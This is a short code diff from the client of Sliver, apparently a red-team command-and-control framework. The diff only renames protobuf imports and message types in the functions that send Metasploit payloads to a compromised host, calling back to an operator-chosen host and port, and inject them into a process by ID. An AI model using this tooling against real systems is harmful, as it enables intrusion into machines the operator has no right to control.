@@ -3,7 +3,8 @@ package command
 import (
 	"fmt"
 	consts "sliver/client/constants"
-	pb "sliver/protobuf/client"
+	clientpb "sliver/protobuf/client"
+	sliverpb "sliver/protobuf/sliver"
 
 	"sliver/client/spin"
 
@@ -34,7 +35,7 @@ func msf(ctx *grumble.Context, rpc RPCServer) {
 	msg := fmt.Sprintf("Sending payload %s %s/%s -> %s:%d ...",
 		payloadName, activeSliver.OS, activeSliver.Arch, lhost, lport)
 	go spin.Until(msg, ctrl)
-	data, _ := proto.Marshal(&pb.MSFReq{
+	data, _ := proto.Marshal(&clientpb.MSFReq{
 		Payload:    payloadName,
 		LHost:      lhost,
 		LPort:      int32(lport),
@@ -42,8 +43,8 @@ func msf(ctx *grumble.Context, rpc RPCServer) {
 		Iterations: int32(iterations),
 		SliverID:   ActiveSliver.Sliver.ID,
 	})
-	resp := <-rpc(&pb.Envelope{
-		Type: consts.MsfStr,
+	resp := <-rpc(&sliverpb.Envelope{
+		Type: clientpb.MsgMsf,
 		Data: data,
 	}, defaultTimeout)
 	ctrl <- true
@@ -83,7 +84,7 @@ func msfInject(ctx *grumble.Context, rpc RPCServer) {
 	msg := fmt.Sprintf("Injecting payload %s %s/%s -> %s:%d ...",
 		payloadName, activeSliver.OS, activeSliver.Arch, lhost, lport)
 	go spin.Until(msg, ctrl)
-	data, _ := proto.Marshal(&pb.MSFInjectReq{
+	data, _ := proto.Marshal(&clientpb.MSFInjectReq{
 		Payload:    payloadName,
 		LHost:      lhost,
 		LPort:      int32(lport),
@@ -92,8 +93,8 @@ func msfInject(ctx *grumble.Context, rpc RPCServer) {
 		PID:        int32(pid),
 		SliverID:   ActiveSliver.Sliver.ID,
 	})
-	resp := <-rpc(&pb.Envelope{
-		Type: consts.MsfStr,
+	resp := <-rpc(&sliverpb.Envelope{
+		Type: clientpb.MsgMsf,
 		Data: data,
 	}, defaultTimeout)
 	ctrl <- true
